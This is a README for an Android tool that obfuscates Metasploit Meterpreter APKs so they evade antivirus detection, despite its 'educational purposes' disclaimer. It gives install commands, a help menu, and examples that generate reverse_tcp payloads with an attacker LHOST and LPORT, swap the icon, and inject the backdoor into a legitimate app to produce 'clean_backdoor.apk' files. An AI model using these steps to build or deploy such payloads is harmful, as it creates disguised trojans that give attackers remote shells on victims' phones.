# AMCleaner
Simple Android APK Obfuscator to evade AV products, Only for educational purposes
## Installation
```
git clone https://github.com/abdallah-elsharif/AMCleaner.git
cd AMCleaner
chmod 755 install.sh
sudo ./install.sh
```
## run
```
┌──(user㉿hostname)-[~/path/to/AMCleaner]
└─$ ./AMCleaner.sh -h

          *****************************************************************
          *                                                               *
          *    Author      =>  Abdallah Mohamed                           *
          *    Tool        =>  Android Meterpreter Obfuscator             *
          *    Greetz to   =>  Riddef, Ghost5egy, 7AZ30AN                 *
          *    Warning     =>  This tool is only for educational purpose  *
          *                                                               *
          *                                                               *
          *    Usage   :                                                  *
          *            ./AMCleaner.sh [options] Or -h , --help            *
          *                                                               *
          *****************************************************************



-h , --help                                   Display Help menu
-i=input.apk , --input=...                    Enter your meterpreter apk path
-g=PayloadName.apk , --generate=...           For generate payload
-p=payload_type , --payload=...               Payload type ex(android/meterpreter/reverse_tcp)
-O=options , --options=...                    Payload options ex("LHOST=... LPORT=...")
-x=real_app.apk                               Enter app path to inject payload into
--icon=icon.png                               Your icon path
--runmsf                                      Run msfconsole


Examples :
      ./AMCleaner.sh -i path/to/meterpreter.apk -o clean_meterpreter.apk

      ./AMCleaner.sh -i path/to/meterpreter.apk --icon path/to/icon.png -o clean_meterpreter.apk

      ./AMCleaner.sh -g payload.apk -p android/meterpreter/reverse_tcp -O "LHOST=192.168.1.4 LPORT=1111" --icon path/to/icon.png -o path/to/clean_backdoor.apk

      ./AMCleaner.sh -g payload.apk -p android/meterpreter/reverse_tcp -O "LHOST=192.168.1.4 LPORT=1111" -x path/to/real.apk -o path/to/clean_backdoor.apk


```
